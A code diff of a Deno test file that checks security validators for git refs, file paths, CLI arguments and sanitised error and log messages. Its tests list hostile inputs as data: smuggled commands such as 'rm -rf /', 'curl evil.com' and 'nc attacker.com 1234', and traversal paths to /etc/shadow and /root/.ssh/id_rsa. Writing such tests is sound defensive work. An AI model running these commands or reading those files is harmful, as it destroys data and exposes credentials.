@@ -3,7 +3,7 @@
  * @module security-utils_test
  */
 
-import { assertEquals, assertRejects, assertThrows } from "jsr:@std/assert";
+import { assertEquals, assertThrows } from "jsr:@std/assert";
 import {
   createSecurityLog,
   sanitizeCommitMessage,
@@ -19,7 +19,7 @@ Deno.test("validateGitRef - valid tags", () => {
   assertEquals(validateGitRef("v1.2.3", "tag"), "v1.2.3");
   assertEquals(validateGitRef("release-1.0", "tag"), "release-1.0");
   assertEquals(validateGitRef("feature/new-feature", "tag"), "feature/new-feature");
-  
+
   // Trimming
   assertEquals(validateGitRef("  v1.2.3  ", "tag"), "v1.2.3");
 });
@@ -29,13 +29,13 @@ Deno.test("validateGitRef - invalid tags", () => {
   assertThrows(() => validateGitRef("tag with spaces", "tag"), Error, "forbidden characters");
   assertThrows(() => validateGitRef("tag:colon", "tag"), Error, "forbidden characters");
   assertThrows(() => validateGitRef("tag[bracket]", "tag"), Error, "forbidden characters");
-  
+
   // Invalid patterns
   assertThrows(() => validateGitRef("-startswithdash", "tag"), Error, "invalid pattern");
   assertThrows(() => validateGitRef("ends.lock", "tag"), Error, "invalid pattern");
   assertThrows(() => validateGitRef("has..dots", "tag"), Error, "invalid pattern");
   assertThrows(() => validateGitRef("ends.", "tag"), Error, "invalid pattern");
-  
+
   // Empty
   assertThrows(() => validateGitRef("", "tag"), Error, "must be a non-empty string");
   assertThrows(() => validateGitRef("   ", "tag"), Error, "cannot be empty");
@@ -46,7 +46,7 @@ Deno.test("validateGitRef - valid commits", () => {
   assertEquals(validateGitRef("1234567890abcdef", "commit"), "1234567890abcdef");
   assertEquals(
     validateGitRef("1234567890abcdef1234567890abcdef12345678", "commit"),
-    "1234567890abcdef1234567890abcdef12345678"
+    "1234567890abcdef1234567890abcdef12345678",
   );
 });
 
@@ -58,75 +58,94 @@ Deno.test("validateGitRef - invalid commits", () => {
 
 Deno.test("validateFilePath - valid paths", () => {
   const basePath = "/home/project";
-  
+
   // Relative paths
   assertEquals(validateFilePath("./src/file.ts", basePath), "/home/project/src/file.ts");
   assertEquals(validateFilePath("src/file.ts", basePath), "/home/project/src/file.ts");
-  
+
   // Absolute paths within base
-  assertEquals(validateFilePath("/home/project/src/file.ts", basePath), "/home/project/src/file.ts");
-  
+  assertEquals(
+    validateFilePath("/home/project/src/file.ts", basePath),
+    "/home/project/src/file.ts",
+  );
+
   // Temp paths (allowed)
   assertEquals(
     validateFilePath("/tmp/test.txt", basePath),
-    "/tmp/test.txt"
+    "/tmp/test.txt",
   );
   assertEquals(
     validateFilePath("/var/folders/xyz/temp.txt", basePath),
-    "/var/folders/xyz/temp.txt"
+    "/var/folders/xyz/temp.txt",
   );
 });
 
 Deno.test("validateFilePath - directory traversal", () => {
   const basePath = "/home/project";
-  
+
   // Directory traversal attempts
-  assertThrows(() => validateFilePath("../../../etc/passwd", basePath), Error, "directory traversal");
-  assertThrows(() => validateFilePath("./src/../../../etc/passwd", basePath), Error, "directory traversal");
-  assertThrows(() => validateFilePath("..\\..\\..\\windows\\system32", basePath), Error, "directory traversal");
+  assertThrows(
+    () => validateFilePath("../../../etc/passwd", basePath),
+    Error,
+    "directory traversal",
+  );
+  assertThrows(
+    () => validateFilePath("./src/../../../etc/passwd", basePath),
+    Error,
+    "directory traversal",
+  );
+  assertThrows(
+    () => validateFilePath("..\\..\\..\\windows\\system32", basePath),
+    Error,
+    "directory traversal",
+  );
 });
 
 Deno.test("validateFilePath - escaping base directory", () => {
   const basePath = "/home/project";
-  
+
   // Paths outside base (not temp)
   assertThrows(() => validateFilePath("/etc/passwd", basePath), Error, "escapes base directory");
-  assertThrows(() => validateFilePath("/home/other/file.txt", basePath), Error, "escapes base directory");
+  assertThrows(
+    () => validateFilePath("/home/other/file.txt", basePath),
+    Error,
+    "escapes base directory",
+  );
 });
 
 Deno.test("sanitizeCommitMessage", () => {
   // Normal messages
   assertEquals(
     sanitizeCommitMessage("feat: add new feature"),
-    "feat: add new feature"
+    "feat: add new feature",
   );
-  
+
   // Null bytes removed
   assertEquals(
     sanitizeCommitMessage("feat: add\0new feature"),
-    "feat: addnew feature"
+    "feat: addnew feature",
   );
-  
+
   // Line ending normalization
   assertEquals(
     sanitizeCommitMessage("feat: add\r\nnew feature"),
-    "feat: add\nnew feature"
+    "feat: add\nnew feature",
   );
   assertEquals(
     sanitizeCommitMessage("feat: add\rnew feature"),
-    "feat: add\nnew feature"
+    "feat: add\nnew feature",
   );
-  
+
   // Long messages truncated
   const longMessage = "x".repeat(15000);
   const result = sanitizeCommitMessage(longMessage);
   assertEquals(result.length, 10000 + "... (truncated)".length);
   assertEquals(result.endsWith("... (truncated)"), true);
-  
+
   // Invalid input
   assertEquals(sanitizeCommitMessage(""), "");
-  assertEquals(sanitizeCommitMessage(null as any), "");
-  assertEquals(sanitizeCommitMessage(undefined as any), "");
+  assertEquals(sanitizeCommitMessage(null as unknown as string), "");
+  assertEquals(sanitizeCommitMessage(undefined as unknown as string), "");
 });
 
 Deno.test("validateVersion", () => {
@@ -135,10 +154,10 @@ Deno.test("validateVersion", () => {
   assertEquals(validateVersion("v1.2.3"), "v1.2.3");
   assertEquals(validateVersion("1.2.3-beta.1"), "1.2.3-beta.1");
   assertEquals(validateVersion("1.2.3-rc.1+build.123"), "1.2.3-rc.1+build.123");
-  
+
   // Trimming
   assertEquals(validateVersion("  1.2.3  "), "1.2.3");
-  
+
   // Invalid versions
   assertThrows(() => validateVersion("1.2"), Error, "valid semver");
   assertThrows(() => validateVersion("a.b.c"), Error, "valid semver");
@@ -152,14 +171,14 @@ Deno.test("sanitizeErrorMessage", () => {
   const sanitized = sanitizeErrorMessage(error, false);
   assertEquals(sanitized.includes("/home/user/project"), false);
   assertEquals(sanitized.includes("/***/***/***/***"), true);
-  
+
   // With stack trace
   const errorWithStack = new Error("Failed");
   errorWithStack.stack = "Error: Failed\n    at /home/user/project/src/file.ts:10:5";
   const sanitizedWithStack = sanitizeErrorMessage(errorWithStack, true);
   assertEquals(sanitizedWithStack.includes("Stack trace:"), true);
   assertEquals(sanitizedWithStack.includes("/home/user/project"), false);
-  
+
   // IP addresses
   const ipError = new Error("Connection failed to 192.168.1.1:8080");
   const sanitizedIp = sanitizeErrorMessage(ipError, false);
@@ -167,7 +186,7 @@ Deno.test("sanitizeErrorMessage", () => {
   assertEquals(sanitizedIp.includes("***.***.***.***"), true);
   assertEquals(sanitizedIp.includes(":8080"), false);
   assertEquals(sanitizedIp.includes(":****"), true);
-  
+
   // Secrets
   const secretError = new Error("Auth failed with token=abc123secret and password=mypass");
   const sanitizedSecret = sanitizeErrorMessage(secretError, false);
@@ -175,7 +194,7 @@ Deno.test("sanitizeErrorMessage", () => {
   assertEquals(sanitizedSecret.includes("mypass"), false);
   assertEquals(sanitizedSecret.includes("token=***"), true);
   assertEquals(sanitizedSecret.includes("password=***"), true);
-  
+
   // Non-Error objects
   assertEquals(sanitizeErrorMessage("string error", false), "An error occurred");
   assertEquals(sanitizeErrorMessage({ message: "object" }, false), "An error occurred");
@@ -186,22 +205,26 @@ Deno.test("validateCliArgs", () => {
   // Valid args
   assertEquals(
     validateCliArgs(["--version", "1.2.3", "--tag", "v1.2.3"]),
-    ["--version", "1.2.3", "--tag", "v1.2.3"]
+    ["--version", "1.2.3", "--tag", "v1.2.3"],
   );
-  
+
   // Shell metacharacters
   assertThrows(() => validateCliArgs(["rm -rf /", ";echo hacked"]), Error, "shell metacharacters");
   assertThrows(() => validateCliArgs(["test", "&&", "malicious"]), Error, "shell metacharacters");
   assertThrows(() => validateCliArgs(["$(whoami)"]), Error, "shell metacharacters");
   assertThrows(() => validateCliArgs(["`id`"]), Error, "shell metacharacters");
   assertThrows(() => validateCliArgs(["test|pipe"]), Error, "shell metacharacters");
-  
+
   // Null bytes
   assertThrows(() => validateCliArgs(["test\0null"]), Error, "null byte");
-  
+
   // Non-string arguments
-  assertThrows(() => validateCliArgs([123 as any]), Error, "must be strings");
-  assertThrows(() => validateCliArgs([{ cmd: "test" } as any]), Error, "must be strings");
+  assertThrows(() => validateCliArgs([123 as unknown as string]), Error, "must be strings");
+  assertThrows(
+    () => validateCliArgs([{ cmd: "test" } as unknown as string]),
+    Error,
+    "must be strings",
+  );
 });
 
 Deno.test("createSecurityLog", () => {
@@ -211,20 +234,20 @@ Deno.test("createSecurityLog", () => {
     secret: "should-be-hidden",
     password: "also-hidden",
   });
-  
+
   // Should contain action
   assertEquals(log.includes("[SECURITY]"), true);
   assertEquals(log.includes("Action: user_login"), true);
-  
+
   // Should contain timestamp
   assertEquals(log.includes(new Date().getFullYear().toString()), true);
-  
+
   // Should sanitize sensitive data
   assertEquals(log.includes("should-be-hidden"), false);
   assertEquals(log.includes("also-hidden"), false);
   assertEquals(log.includes('"secret": "***"'), true);
   assertEquals(log.includes('"password": "***"'), true);
-  
+
   // Should preserve non-sensitive data
   assertEquals(log.includes("john.doe"), true);
   assertEquals(log.includes("192.168.1.1"), true);
@@ -237,17 +260,17 @@ Deno.test("security - prevent command injection", () => {
     "v1.0.0; rm -rf /",
     "v1.0.0 && curl evil.com",
     "v1.0.0 | nc attacker.com 1234",
-    "v1.0.0:whoami",  // colon is forbidden
-    "v1.0.0[id]",     // brackets are forbidden
+    "v1.0.0:whoami", // colon is forbidden
+    "v1.0.0[id]", // brackets are forbidden
     "v1.0.0\nrm -rf /",
   ];
-  
+
   for (const input of dangerousInputs) {
     assertThrows(
       () => validateGitRef(input, "tag"),
       Error,
       undefined,
-      `Should reject dangerous input: ${input}`
+      `Should reject dangerous input: ${input}`,
     );
   }
 });
@@ -261,13 +284,13 @@ Deno.test("security - prevent path traversal", () => {
     "./valid/../../../../../../etc/shadow",
     "subdir/../../../../../../../root/.ssh/id_rsa",
   ];
-  
+
   for (const attempt of traversalAttempts) {
     assertThrows(
       () => validateFilePath(attempt, basePath),
       Error,
       undefined,
-      `Should reject traversal attempt: ${attempt}`
+      `Should reject traversal attempt: ${attempt}`,
     );
   }
 });
